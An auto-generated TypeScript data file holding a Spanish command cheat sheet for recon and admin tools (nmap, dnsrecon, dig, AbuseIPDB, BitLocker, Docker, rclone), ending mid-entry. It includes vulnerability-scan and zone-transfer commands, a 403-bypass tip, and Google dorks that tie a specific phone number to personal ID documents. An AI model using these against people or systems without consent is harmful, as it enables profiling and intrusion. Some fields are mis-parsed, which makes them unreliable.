// Este archivo es generado automáticamente desde Notion
// NO editar manualmente - los cambios se sobrescribirán

export interface Command {
  id: string;
  title: string;
  command: string;
  description: string;
  category: string;
  tags: string[];
  examples?: string[];
  dangerous?: boolean;
  platform?: string;
  syntax?: string;
  parameters?: Array<{
    param: string;
    description: string;
    example: string;
  }>;
  output?: string;
  notes?: string;
  references?: string[];
  created_at: string;
  updated_at: string;
}

export const commands: Command[] = [
  {
    "id": "318ec7e7-4fc0-81e9-b01a-e7155640eb52",
    "title": "AbuseIPDB",
    "command": "curl -G ",
    "description": "Base de datos colaborativa para consultar y reportar reputación de IPs maliciosas con historial de reportes y nivel de confianza.",
    "category": "OSINT",
    "tags": [],
    "examples": [
      "curl -G https://api.abuseipdb.com/api/v2/check \\\n  --data-urlencode \"ipAddress=165.227.84.14\" \\\n  -H \"Key: TU_API_KEY\" \\\n  -H \"Accept: application/json\"",
      "# Consulta manual en la web\nhttps://www.abuseipdb.com/check/IP_AQUI\n\n# Consulta via API\ncurl -G https://api.abuseipdb.com/api/v2/check \\\n  --data-urlencode \"ipAddress=IP_AQUI\" \\\n  -d maxAgeInDays=90 \\\n  -H \"Key: TU_API_KEY\" \\\n  -H \"Accept: application/json\"",
      "# Abrir en navegador:\nhttps://www.abuseipdb.com/check/165.227.84.14\n# Ver: Confidence Score, ISP, número de reportes, tipos de abuso",
      "curl -G https://api.abuseipdb.com/api/v2/check \\\n  --data-urlencode \"ipAddress=165.227.84.14\" \\\n  -d maxAgeInDays=90 \\\n  -d verbose \\\n  -H \"Key: TU_API_KEY\" \\\n  -H \"Accept: application/json\" | jq ."
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "curl -G https://api.abuseipdb.com/api/v2/check \\\n  --data-urlencode \"ipAddress=165.227.84.14\" \\\n  -H \"Key: TU_API_KEY\" \\\n  -H \"Accept: application/json\"",
    "parameters": [
      {
        "param": "ipAddress",
        "description": "IP a consultar",
        "example": "`--data-urlencode \"ipAddress=1.2.3.4\"`"
      },
      {
        "param": "maxAgeInDays",
        "description": "Rango de días para reportes (default 30)",
        "example": "`-d maxAgeInDays=90`"
      },
      {
        "param": "verbose",
        "description": "Muestra reportes individuales",
        "example": "`-d verbose`"
      },
      {
        "param": "Key",
        "description": "API key del header",
        "example": "`-H \"Key: abc123\"`"
      }
    ],
    "output": "",
    "notes": "- Confidence Score 100% con miles de reportes no siempre significa ataque dirigido; puede ser un scanner legítimo (como LeakIX) muy reportado\n- Revisar el hostname de la IP en Shodan para confirmar si es un servicio conocido de investigación\n- Los tipos de abuso más comunes: Port Scan, Hacking, Web App Attack, Brute-Force\n- Integrarlo en scripts de monitoreo para alertas automáticas sobre IPs en tus logs\n- API gratuita disponible con registro; límite de 1000 consultas/día en plan free",
    "references": [
      "AbuseIPDB",
      "Documentación API",
      "Registro para API Key"
    ],
    "created_at": "2026-03-03T03:17:00.000Z",
    "updated_at": "2026-04-18T15:08:00.000Z"
  },
  {
    "id": "318ec7e7-4fc0-81de-ba9c-e3467b0948b8",
    "title": "BitLocker Self-Custody",
    "command": "manage-bde -protectors -enable C: -RecoveryPassword",
    "description": "Protocolo para gestionar claves de recuperación de BitLocker localmente, eliminando la dependencia de Microsoft/nube y rotando la clave para invalidar copias previas.",
    "category": "Cifrado",
    "tags": [],
    "examples": [
      "### **📌 Descripción breve**\n\n> Protocolo para sacar la Recovery Key de BitLocker de la nube de Microsoft, guardarla offline y rotarla para invalidar cualquier copia previa. Aplica cuando se usa cuenta Microsoft en Windows 10/11.\n\n---\n\n\n### **🛠 Sintaxis básica**",
      "---\n\n\n### **⚙️ Parámetros clave**\n\n\n| Fase               | Acción                                                | Comando                                                                                                |\n| ------------------ | ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |\n| 1 — Respaldar      | Anotar clave actual en papel/USB offline              | `manage-bde -protectors -get C:`                                                                       |\n| 2 — Borrar de nube | Eliminar entradas en portal Microsoft                 | [https://account.microsoft.com/devices/recoverykey](https://account.microsoft.com/devices/recoverykey) |\n| 3 — Rotar clave    | Generar nueva Recovery Key (nunca ha tocado internet) | `manage-bde -protectors -disable C:` luego `-enable C: -RecoveryPassword`                              |\n| 4 — Verificar      | Confirmar que el ID y clave cambiaron                 | `manage-bde -protectors -get C:`                                                                       |\n\n\n---\n\n\n### **🚀 Ejemplos de uso**\n\n\n**Fase 1 — Respaldar clave actual:**",
      "**Fase 2 — Eliminar de la nube de Microsoft:**",
      "**Fase 3 — Rotar la clave:**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "### **📌 Descripción breve**\n\n> Protocolo para sacar la Recovery Key de BitLocker de la nube de Microsoft, guardarla offline y rotarla para invalidar cualquier copia previa. Aplica cuando se usa cuenta Microsoft en Windows 10/11.\n\n---\n\n\n### **🛠 Sintaxis básica**",
    "parameters": [
      {
        "param": "manage-bde -protectors -get C:",
        "description": "| 2 — Borrar de nube",
        "example": "Eliminar entradas en portal Microsoft"
      }
    ],
    "output": "---\n\n\n### **📤 Salida esperada**",
    "notes": "- La **Recovery Key** (48 dígitos) es la que Microsoft sube automáticamente si se usa cuenta MS. La **VMK** nunca sale del chip TPM.\n- Una clave que tocó un medio no confiable se considera comprometida (OpSec). Rotar = cambiar la cerradura.\n- NUNCA guardar la Recovery Key en archivo de texto en el mismo equipo cifrado.\n- Bajo **CLOUD Act**, Microsoft está obligado a entregar datos bajo orden judicial válida.\n- Para deshabilitar el envío automático: `gpedit.msc` → Configuración de equipo → Plantillas administrativas → Componentes de Windows → BitLocker Drive Encryption.",
    "references": [
      "Portal de claves Microsoft",
      "Documentación manage-bde"
    ],
    "created_at": "2026-03-03T03:27:00.000Z",
    "updated_at": "2026-03-05T03:17:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-81df-a1f0-ca20d9419480",
    "title": "Cloudflare Tunnel (cloudflared)",
    "command": "cloudflared tunnel run <nombre>",
    "description": "Expone servicios a Internet sin abrir puertos en el firewall, usando una conexión saliente del servidor hacia Cloudflare.",
    "category": "Config",
    "tags": [],
    "examples": [
      "cloudflared tunnel run mi-tunnel",
      "cloudflared tunnel login          # Autenticar (genera cert.pem)\ncloudflared tunnel create <n>     # Crear túnel + credencial JSON\ncloudflared tunnel route dns <n> <sub.dom.com>  # CNAME en Cloudflare DNS\ncloudflared tunnel run <n>        # Levantar túnel",
      "**Config file (****`~/.cloudflared/config.yml`****):**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "cloudflared tunnel run mi-tunnel",
    "parameters": [
      {
        "param": "login",
        "description": "Abre browser para autenticar con Cloudflare",
        "example": "| `create <n>`"
      },
      {
        "param": "route dns",
        "description": "Crea CNAME en zona DNS de Cloudflare",
        "example": "| `run <n>`"
      }
    ],
    "output": "---\n\n\n### **Salida esperada**",
    "notes": "- Firewall puede estar **completamente cerrado** (sin puertos 80/443 expuestos).\n- Al rotar entre nubes solo cambia la IP interna; el CNAME de Cloudflare permanece igual.\n- Con `TUNNEL_TOKEN` (dashboard CF) no necesitas montar el JSON de credenciales.\n- No actives el proxy naranja (nube naranja) sobre el subdominio del túnel; ya está implícito.",
    "references": [
      "Cloudflare Tunnel docs",
      "cloudflared Docker Hub"
    ],
    "created_at": "2026-03-05T00:19:00.000Z",
    "updated_at": "2026-04-18T14:42:00.000Z"
  },
  {
    "id": "318ec7e7-4fc0-817b-be5b-e2602ee5be67",
    "title": "dig — Consultas DNS",
    "command": "dig [tipo] ",
    "description": "Herramienta CLI para realizar consultas DNS directas y verificar registros como A, MX, TXT, CAA, DMARC, SPF desde la terminal.",
    "category": "DNS",
    "tags": [],
    "examples": [
      "dig CAA dominio.com\ndig TXT _dmarc.dominio.com\ndig MX dominio.com",
      "dig [tipo_registro] [dominio] [@servidor_dns_opcional]",
      "dig CAA dominio.com",
      "dig TXT _dmarc.dominio.com",
      "dig TXT dominio.com | grep spf",
      "dig MX dominio.com +short",
      "dig -x 165.227.84.14",
      "dig A dominio.com @8.8.8.8"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "dig CAA dominio.com\ndig TXT _dmarc.dominio.com\ndig MX dominio.com",
    "parameters": [
      {
        "param": "A",
        "description": "Resolución IPv4 del dominio",
        "example": "`dig A dominio.com`"
      },
      {
        "param": "MX",
        "description": "Registros de correo",
        "example": "`dig MX dominio.com`"
      },
      {
        "param": "TXT",
        "description": "Registros de texto (SPF, DKIM, DMARC, verificación)",
        "example": "`dig TXT dominio.com`"
      },
      {
        "param": "CAA",
        "description": "Autoridades certificadoras autorizadas",
        "example": "`dig CAA dominio.com`"
      },
      {
        "param": "NS",
        "description": "Nameservers del dominio",
        "example": "`dig NS dominio.com`"
      },
      {
        "param": "-x",
        "description": "Consulta inversa (IP → hostname)",
        "example": "`dig -x 1.2.3.4`"
      },
      {
        "param": "@servidor",
        "description": "Consultar contra un DNS específico",
        "example": "`dig A dominio.com @8.8.8.8`"
      },
      {
        "param": "+short",
        "description": "Salida compacta solo con el valor",
        "example": "`dig A dominio.com +short`"
      }
    ],
    "output": "",
    "notes": "- Usar `+short` para obtener solo el valor del registro, sin cabeceras.\n- Consultar `@8.8.8.8` o `@1.1.1.1` para verificar propagación desde DNS públicos.\n- Los registros DMARC siempre se consultan en el subdominio `_dmarc.dominio.com`.\n- Los registros DKIM se consultan en `[selector]._domainkey.dominio.com`.",
    "references": [
      "dig man page",
      "MXToolbox DNS Lookup"
    ],
    "created_at": "2026-03-03T03:29:00.000Z",
    "updated_at": "2026-04-18T14:59:00.000Z"
  },
  {
    "id": "24fec7e7-4fc0-80ef-a008-f3585a1afc4e",
    "title": "Dnsrecon",
    "command": "dnsrecon -d ejemplo.com -t std",
    "description": "Herramienta para enumerar registros DNS y realizar descubrimiento de subdominios.",
    "category": "Escan",
    "tags": [],
    "examples": [
      "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
      "dnsrecon [opciones]",
      "dnsrecon -d ejemplo.com -t std",
      "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
      "dnsrecon -d ejemplo.com -t axfr"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "dnsrecon -d ejemplo.com -D subdomains.txt -t brt",
    "parameters": [
      {
        "param": "-d",
        "description": "Dominio objetivo",
        "example": "`-d ejemplo.com`"
      },
      {
        "param": "-t",
        "description": "Tipo de enumeración (`std`, `brt`, `axfr`, `goo`)",
        "example": "`-t brt`"
      },
      {
        "param": "-D",
        "description": "Diccionario de subdominios",
        "example": "`-D subdomains.txt`"
      },
      {
        "param": "--lifetime",
        "description": "Timeout de consulta",
        "example": "`--lifetime 5`"
      }
    ],
    "output": "",
    "notes": "- El tipo `std` obtiene registros básicos (A, AAAA, MX, NS, TXT).\n- Usar `t goo` para buscar subdominios indexados en Google.\n- Con diccionarios grandes, limitar el tiempo de consulta con `-lifetime`.",
    "references": [
      "Repositorio oficial",
      "Documentación"
    ],
    "created_at": "2025-08-14T20:53:00.000Z",
    "updated_at": "2026-04-18T15:25:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-81dd-8022-d408e0bfa831",
    "title": "Docker Compose",
    "command": "docker compose up -d",
    "description": "Plugin integrado de Docker para orquestar múltiples contenedores; reemplaza el binario docker-compose V1 con sintaxis de espacio.",
    "category": "Linux",
    "tags": [],
    "examples": [
      "# V2 (correcto en Docker moderno)\ndocker compose up -d\n\n# V1 (obsoleto — produce \"command not found\" en Docker V2)\ndocker-compose up -d",
      "docker compose [comando] [opciones]",
      "sudo apt-get update && sudo apt-get install docker-compose-plugin",
      "docker compose version\n# Docker Compose version v2.x.x",
      "docker compose ps\ndocker ps -a          # todos los contenedores del host\ndocker stats          # consumo CPU/RAM en tiempo real"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# V2 (correcto en Docker moderno)\ndocker compose up -d\n\n# V1 (obsoleto — produce \"command not found\" en Docker V2)\ndocker-compose up -d",
    "parameters": [
      {
        "param": "up -d",
        "description": "Levanta el stack en segundo plano",
        "example": "`docker compose up -d`"
      },
      {
        "param": "down",
        "description": "Detiene y elimina contenedores/redes",
        "example": "`docker compose down`"
      },
      {
        "param": "logs -f",
        "description": "Sigue los logs en tiempo real",
        "example": "`docker compose logs -f`"
      },
      {
        "param": "ps",
        "description": "Estado de los servicios del stack",
        "example": "`docker compose ps`"
      },
      {
        "param": "restart",
        "description": "Reinicia un servicio específico",
        "example": "`docker compose restart wazuh-manager`"
      },
      {
        "param": "pull",
        "description": "Descarga imágenes actualizadas",
        "example": "`docker compose pull`"
      }
    ],
    "output": "",
    "notes": "- El warning `the attribute 'version' is obsolete` en V2 es informativo — no rompe nada; se puede eliminar la línea `version:` del YAML\n- Siempre ejecutar desde el directorio que contiene `docker-compose.yml`\n- `docker compose down` elimina contenedores y redes pero **no** los volúmenes; usar `down -v` para eliminar volúmenes también\n- `docker compose up -d --build` fuerza rebuild de imágenes locales",
    "references": [
      "Docker Compose V2 — Docs oficiales"
    ],
    "created_at": "2026-03-05T00:16:00.000Z",
    "updated_at": "2026-04-18T14:44:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-8175-8d7b-c1076954377b",
    "title": "Docker External Networks",
    "command": "docker network create shared_net",
    "description": "Redes Docker compartidas entre proyectos Compose separados para que contenedores de distintos stacks se comuniquen.",
    "category": "Config",
    "tags": [],
    "examples": [
      "# Crear red externa\ndocker network create shared_net\n\n# Referenciar en docker-compose.yml\nnetworks:\n  shared_net:\n    external: true",
      "---\n\n\n### **Parámetros clave**\n\n\n| Parámetro        | Descripción                           | Ejemplo               |\n| ---------------- | ------------------------------------- | --------------------- |\n| `external: true` | La red ya existe; Docker no la crea   | ver arriba            |\n| `name`           | Nombre explícito si difiere del alias | `name: mi_red_global` |\n\n\n---\n\n\n###  **Ejemplos de uso**\n\n\n**Crear la red una vez:**",
      "**Stack A — exponer servicio:**",
      "**Stack B — consumir por nombre de servicio:**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "# Crear red externa\ndocker network create shared_net\n\n# Referenciar en docker-compose.yml\nnetworks:\n  shared_net:\n    external: true",
    "parameters": [
      {
        "param": "external: true",
        "description": "La red ya existe; Docker no la crea",
        "example": "ver arriba"
      },
      {
        "param": "name",
        "description": "Nombre explícito si difiere del alias",
        "example": "`name: mi_red_global`"
      }
    ],
    "output": "---\n\n\n### **📤 Salida esperada**",
    "notes": "- La red debe existir **antes** de `docker compose up` en cualquier stack.\n- Los contenedores se llaman por **nombre de servicio**, no por IP.\n- Para multi-host usar overlay networks con Docker Swarm.\n- Proyectos en carpetas distintas = redes distintas por defecto; external network rompe ese aislamiento deliberadamente.",
    "references": [
      "Docker Networking overview",
      "Compose networking"
    ],
    "created_at": "2026-03-05T00:19:00.000Z",
    "updated_at": "2026-04-18T14:41:00.000Z"
  },
  {
    "id": "28aec7e7-4fc0-8080-b36c-c6da57b219e3",
    "title": "Google Dorking",
    "command": "dnsrecon -d ejemplo.com -t std",
    "description": "Realizar busquedas avanzadas con filtros en google.",
    "category": "OSINT",
    "tags": [],
    "examples": [
      "\"incident report\" filetype:pdf site:av-test.org",
      "\"Busqueda\" > Coincidencia exacta de la frase\nsite:site.com > Busqueda unicamente en el dominio seleccionado.",
      "site:facebook.com \"Datos Robados\"",
      "\"445 118 4920\" OR \"+524451184920\" OR \"4451184920\"",
      "site:twitter.com OR site:x.com \"4451184920\" OR \"+52524451184920\"",
      "filetype:pdf \"numero\" OR \"+52 numeor\"\nfiletype:xls OR filetype:xlsx \"Numeor\" \"Puebla\" OR \"CDMX\"\nfiletype:doc OR filetype:docx intext:\"Numeor\" \"keyW\" OR \"keyW\"\n\nintext:\"TU_NÚMERO\" filetype:pdf site:.mx",
      "(\"445 118 4920\" OR \"+524451184920\" OR \"4451184920\" OR \"+52 445 118 4920\") (\"Lugar 1\" OR \"Lugar 2\" OR \"Puebla\" OR \"Key 1\" OR \"KEy 2\")\nsite:facebook.com OR site:mercadolibre.com.mx OR site:olx.com.mx \"445 118 4920\"\nintext:\"445 118 4920\" (WhatsApp OR celular OR teléfono OR contacto)\n\"445 118 4920\" (RFC OR CURP OR INE) filetype:pdf OR filetype:jpg"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "\"incident report\" filetype:pdf site:av-test.org",
    "parameters": [],
    "output": "",
    "notes": "- **Legal/ético:** úsalo solo en activos propios o con permiso.\n- **Reduce ruido:** combina `site:` + `filetype:` + una frase exacta entre comillas.",
    "references": [],
    "created_at": "2025-10-12T22:59:00.000Z",
    "updated_at": "2026-04-18T18:32:00.000Z"
  },
  {
    "id": "341ec7e7-4fc0-8121-80d7-dbc50a421146",
    "title": "HTTP Status Codes",
    "command": "curl -o /dev/null -s -w \"%{http_code}\" ",
    "description": "Referencia rápida de los códigos de estado HTTP agrupados por categoría: informativos, éxito, redirección, errores de cliente y errores de servidor.",
    "category": "Config",
    "tags": [],
    "examples": [
      "curl -o /dev/null -s -w \"%{http_code}\" https://example.com",
      "HTTP/1.1 <código> <mensaje>",
      "curl -o /dev/null -s -w \"%{http_code}\" https://example.com",
      "curl -I https://example.com",
      "curl -L https://example.com"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "curl -o /dev/null -s -w \"%{http_code}\" https://example.com",
    "parameters": [
      {
        "param": "100",
        "description": "Continue",
        "example": "El servidor recibió la solicitud inicial; el cliente puede continuar."
      },
      {
        "param": "101",
        "description": "Switching Protocols",
        "example": "El servidor acepta cambiar de protocolo (ej. WebSocket)."
      },
      {
        "param": "200",
        "description": "OK",
        "example": "La solicitud fue exitosa."
      },
      {
        "param": "201",
        "description": "Created",
        "example": "Recurso creado correctamente (ej. tras un POST)."
      },
      {
        "param": "301",
        "description": "Moved Permanently",
        "example": "El recurso se movió definitivamente a otra URL."
      },
      {
        "param": "302",
        "description": "Found",
        "example": "Redirección temporal a otra URL."
      },
      {
        "param": "400",
        "description": "Bad Request",
        "example": "La solicitud tiene sintaxis incorrecta o es inválida."
      },
      {
        "param": "401",
        "description": "Unauthorized",
        "example": "Se requiere autenticación para acceder al recurso."
      },
      {
        "param": "403",
        "description": "Forbidden",
        "example": "El servidor rechaza la solicitud aunque el cliente esté autenticado."
      },
      {
        "param": "404",
        "description": "Not Found",
        "example": "El recurso solicitado no existe en el servidor."
      },
      {
        "param": "405",
        "description": "Method Not Allowed",
        "example": "El método HTTP usado no está permitido para ese endpoint."
      },
      {
        "param": "429",
        "description": "Too Many Requests",
        "example": "El cliente ha enviado demasiadas solicitudes en poco tiempo (rate limiting)."
      },
      {
        "param": "500",
        "description": "Internal Server Error",
        "example": "Error genérico en el servidor; algo falló internamente."
      },
      {
        "param": "502",
        "description": "Bad Gateway",
        "example": "El servidor actúa como proxy y recibió una respuesta inválida del upstream."
      },
      {
        "param": "503",
        "description": "Service Unavailable",
        "example": "El servidor no puede manejar solicitudes (sobrecarga o mantenimiento)."
      },
      {
        "param": "504",
        "description": "Gateway Timeout",
        "example": "El servidor proxy no recibió respuesta a tiempo del upstream."
      }
    ],
    "output": "",
    "notes": "- `401` = sin autenticar; `403` = autenticado pero sin permisos.\n- `429` se usa para detectar rate limiting en fuzzing/escaneo web.\n- `502`/`504` en proxies inversos suelen indicar que el backend está caído.\n- En pentesting, un `403` a veces puede bypassearse cambiando headers como `X-Forwarded-For`.\n- El código `200` en un `OPTIONS` revela métodos HTTP permitidos por el servidor.",
    "references": [
      "MDN Web Docs — HTTP response status codes",
      "RFC 9110 — HTTP Semantics"
    ],
    "created_at": "2026-04-13T10:33:00.000Z",
    "updated_at": "2026-04-18T15:04:00.000Z"
  },
  {
    "id": "253ec7e7-4fc0-80e2-bdb9-e54621c69807",
    "title": "Ls ",
    "command": "ls -la /home/usuario/documentos",
    "description": " listar archivos y directorios",
    "category": "Linux",
    "tags": [],
    "examples": [
      "ls -la /home/usuario/documentos"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "ls -la /home/usuario/documentos",
    "parameters": [
      {
        "param": "-l",
        "description": "Formato largo (permisos, propietario, tamaño)",
        "example": "`ls -l`"
      },
      {
        "param": "-a",
        "description": "Mostrar archivos ocultos (incluye . y ..)",
        "example": "`ls -a`"
      },
      {
        "param": "-h",
        "description": "Tamaños legibles para humanos (KB, MB, GB)",
        "example": "`ls -lh`"
      },
      {
        "param": "-t",
        "description": "Ordenar por fecha de modificación",
        "example": "`ls -lt`"
      },
      {
        "param": "-r",
        "description": "Orden reverso",
        "example": "`ls -lr`"
      },
      {
        "param": "-R",
        "description": "Listado recursivo",
        "example": "`ls -R`"
      }
    ],
    "output": "ls\n    ```\n\n- **Listado detallado con archivos ocultos:**\n\n    ```bash\n    ls -la\n    ```\n\n- **Listado con tamaños legibles ordenado por fecha:**\n\n    ```bash\n    ls -lht\n    ```\n\n- **Listado recursivo de subdirectorios:**\n\n    ```bash\n    ls -R /var/log\n    ```\n\n\n**Salida esperada**",
    "notes": "",
    "references": [
      "Manual de ls",
      "Guía de comandos Linux"
    ],
    "created_at": "2025-08-18T01:16:00.000Z",
    "updated_at": "2026-04-18T15:25:00.000Z"
  },
  {
    "id": "318ec7e7-4fc0-81b5-9ed6-dd1d521dc3dd",
    "title": "manage-bde",
    "command": "manage-bde -status",
    "description": "CLI de Windows para administrar BitLocker: ver estado del cifrado, listar protectores, habilitar/deshabilitar y rotar claves de recuperación.",
    "category": "Cifrado",
    "tags": [],
    "examples": [
      "###  **Descripción breve**\n\n> Herramienta CLI de Windows (PowerShell/CMD) para gestionar BitLocker Drive Encryption. Permite ver estado de cifrado, administrar protectores y generar claves de recuperación. Requiere permisos de Administrador.\n\n---\n\n\n### **Sintaxis básica**",
      "---\n\n\n### **Parámetros clave**\n\n\n| Comando                                 | Descripción                                    | Ejemplo                                               |\n| --------------------------------------- | ---------------------------------------------- | ----------------------------------------------------- |\n| `-status`                               | Estado del cifrado de todos los volúmenes      | `manage-bde -status`                                  |\n| `-on`                                   | Activa BitLocker en un volumen                 | `manage-bde -on C:`                                   |\n| `-off`                                  | Desactiva BitLocker (descifra el volumen)      | `manage-bde -off C:`                                  |\n| `-protectors -get`                      | Lista todos los protectores/claves del volumen | `manage-bde -protectors -get C:`                      |\n| `-protectors -enable`                   | Habilita protectores desactivados              | `manage-bde -protectors -enable C:`                   |\n| `-protectors -disable`                  | Suspende protectores temporalmente             | `manage-bde -protectors -disable C:`                  |\n| `-protectors -enable -RecoveryPassword` | Genera nueva Recovery Key de 48 dígitos        | `manage-bde -protectors -enable C: -RecoveryPassword` |\n| `-protectors -delete -id {UUID}`        | Elimina un protector específico por ID         | `manage-bde -protectors -delete C: -id {UUID}`        |\n\n\n---\n\n\n###  **Ejemplos de uso**\n\n\n**Ver estado completo:**",
      "**Listar claves de recuperación actuales:**",
      "**Rotar (generar nueva) Recovery Key:**"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "###  **Descripción breve**\n\n> Herramienta CLI de Windows (PowerShell/CMD) para gestionar BitLocker Drive Encryption. Permite ver estado de cifrado, administrar protectores y generar claves de recuperación. Requiere permisos de Administrador.\n\n---\n\n\n### **Sintaxis básica**",
    "parameters": [
      {
        "param": "-status",
        "description": "Estado del cifrado de todos los volúmenes",
        "example": "`manage-bde -status`"
      },
      {
        "param": "-on",
        "description": "Activa BitLocker en un volumen",
        "example": "`manage-bde -on C:`"
      },
      {
        "param": "-off",
        "description": "Desactiva BitLocker (descifra el volumen)",
        "example": "`manage-bde -off C:`"
      },
      {
        "param": "-protectors -get",
        "description": "Lista todos los protectores/claves del volumen",
        "example": "`manage-bde -protectors -get C:`"
      },
      {
        "param": "-protectors -enable",
        "description": "Habilita protectores desactivados",
        "example": "`manage-bde -protectors -enable C:`"
      },
      {
        "param": "-protectors -disable",
        "description": "Suspende protectores temporalmente",
        "example": "`manage-bde -protectors -disable C:`"
      },
      {
        "param": "-protectors -enable -RecoveryPassword",
        "description": "Genera nueva Recovery Key de 48 dígitos",
        "example": "`manage-bde -protectors -enable C: -RecoveryPassword`"
      },
      {
        "param": "-protectors -delete -id {UUID}",
        "description": "Elimina un protector específico por ID",
        "example": "`manage-bde -protectors -delete C: -id {UUID}`"
      }
    ],
    "output": "---\n\n\n###  **Salida esperada**",
    "notes": "- Siempre ejecutar como **Administrador** (PowerShell o CMD elevado).\n- `-protectors -disable` es temporal: al reiniciar se reactivan.\n- Después de rotar, verificar que el UUID del protector cambió.\n- Alternativa gráfica: `control /name Microsoft.BitLockerDriveEncryption`",
    "references": [
      "Documentación oficial Microsoft"
    ],
    "created_at": "2026-03-03T03:27:00.000Z",
    "updated_at": "2026-04-18T15:06:00.000Z"
  },
  {
    "id": "31aec7e7-4fc0-814f-9f6e-c4fcb7329944",
    "title": "Nmap",
    "command": "nmap -sC -sV -oN scan.txt <target>",
    "description": "Escáner de red open source para descubrimiento de hosts, puertos abiertos y detección de servicios/OS.",
    "category": "Escan",
    "tags": [],
    "examples": [
      "nmap -sC -sV -oN scan.txt 192.168.1.0/24",
      "nmap [opciones] <target>\n# target puede ser IP, rango CIDR, hostname o archivo",
      "nmap -sC -sV -oN initial.txt <target>",
      "nmap -p- -sC -sV -oN full.txt <target>",
      "sudo nmap -sU -sC -sV --top-ports 200 -oN udp.txt <target>",
      "nmap --script vuln -oN vuln.txt <target>",
      "nmap -sn 192.168.1.0/24   # ping sweep — solo descubre hosts"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "nmap -sC -sV -oN scan.txt 192.168.1.0/24",
    "parameters": [
      {
        "param": "-sC",
        "description": "Scripts NSE por defecto",
        "example": "`nmap -sC <target>`"
      },
      {
        "param": "-sV",
        "description": "Detecta versión de servicios",
        "example": "`nmap -sV <target>`"
      },
      {
        "param": "-sS",
        "description": "SYN scan (stealth, requiere root)",
        "example": "`sudo nmap -sS <target>`"
      },
      {
        "param": "-sU",
        "description": "Escaneo UDP",
        "example": "`sudo nmap -sU <target>`"
      },
      {
        "param": "-p-",
        "description": "Escanear todos los 65535 puertos",
        "example": "`nmap -p- <target>`"
      },
      {
        "param": "-p",
        "description": "Puertos específicos o rango",
        "example": "`nmap -p 22,80,443 <target>`"
      },
      {
        "param": "-O",
        "description": "Detección de OS (requiere root)",
        "example": "`sudo nmap -O <target>`"
      },
      {
        "param": "-A",
        "description": "Aggressive: OS + versión + scripts + traceroute",
        "example": "`nmap -A <target>`"
      },
      {
        "param": "-oN",
        "description": "Output en formato normal",
        "example": "`nmap -oN out.txt <target>`"
      },
      {
        "param": "-oG",
        "description": "Output grepable",
        "example": "`nmap -oG out.gnmap <target>`"
      },
      {
        "param": "--script",
        "description": "Ejecutar script NSE específico",
        "example": "`nmap --script vuln <target>`"
      },
      {
        "param": "-T4",
        "description": "Velocidad agresiva (0=lento, 5=máximo)",
        "example": "`nmap -T4 <target>`"
      },
      {
        "param": "-Pn",
        "description": "Sin ping — asume host activo",
        "example": "`nmap -Pn <target>`"
      },
      {
        "param": "-n",
        "description": "Sin resolución DNS",
        "example": "`nmap -n <target>`"
      }
    ],
    "output": "",
    "notes": "- **Siempre usar Nmap en Linux** — Windows limita Raw Sockets (incluso con Npcap). Los escaneos `-sS` y `-O` fallan o son inestables en Windows.\n- `/24` = tu red doméstica (256 IPs). Evita `/4` o rangos amplios sin permiso — escanear millones de IPs es ilegal.\n- Combina `-p-` con `-T4` para rapidez: `nmap -p- -T4 -sC -sV <target>`\n- Para CTF: primero `nmap -p-` para descubrir todos los puertos, luego `-sC -sV` solo en los abiertos.\n- Output `-oA nombre` genera los 3 formatos a la vez (.nmap, .gnmap, .xml)",
    "references": [
      "Documentación oficial",
      "NSE Scripts"
    ],
    "created_at": "2026-03-05T01:39:00.000Z",
    "updated_at": "2026-04-18T19:09:00.000Z"
  },
  {
    "id": "319ec7e7-4fc0-811f-83d1-f0e7b933b122",
    "title": "Puertos Críticos de Red",
    "command": "nmap -p 22,80,443,3306,3389,5900,8080 <target>",
    "description": "Referencia rápida de los puertos TCP/UDP más importantes en redes: web, bases de datos, acceso remoto, infraestructura y servicios de red.",
    "category": "Redes",
    "tags": [],
    "examples": [
      "nmap -p 22,80,443,3306,3389,5900,8080 <target>"
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "nmap -p 22,80,443,3306,3389,5900,8080 <target>",
    "parameters": [],
    "output": "",
    "notes": "- Puerto 23 (Telnet) y 21 (FTP) transmiten credenciales en claro — evitar en producción\n- Puerto 445 (SMB) es vector frecuente de ransomware\n- Puerto 3389 (RDP) sufre ataques de fuerza bruta constantes — siempre detrás de VPN\n- Puerto 5900 (VNC) suele quedar expuesto con autenticación débil",
    "references": [
      "IANA Port Numbers"
    ],
    "created_at": "2026-03-04T13:59:00.000Z",
    "updated_at": "2026-04-18T14:57:00.000Z"
  },
  {
    "id": "288ec7e7-4fc0-80b3-81ca-f99965597cc9",
    "title": "Rclone",
    "command": "rclone sync \"source\"   \"Destino\\\"   -P ",
    "description": "Como usar Rclone",
    "category": "Config",
    "tags": [],
    "examples": [
      "rclone sync \"source\"   \"Destino\\\"   -P  --exclude \"\"",
      "rclone [comando] [origen] [destino] [opciones]",
      "rclone sync ./MisFotos gdrive:/Fotos --progress --dry-run",
      "rclone mount gdrive:/ ~/GDrive",
      "rclone sync ./Documentos gdrive:/Backup/Documentos -P --delete-after",
      "rclone copy ./notas gdrive:/pdfs --include \"*.pdf\" -P",
      "rclone sync \"C:\\OBS\" \"P:\\OBS\" -P --exclude \"*.tmp\" --exclude \"*.bak\""
    ],
    "dangerous": false,
    "platform": "Unix",
    "syntax": "rclone sync \"source\"   \"Destino\\\"   -P  --exclude \"\"",
    "parameters": [
      {
        "param": "-listremotes",
        "description": "Lista las particones remotas",
        "example": "rclone listremotes"
      },
      {
        "param": "-config delete ''",
        "description": "Elimina el directorio deseado",
        "example": "|"
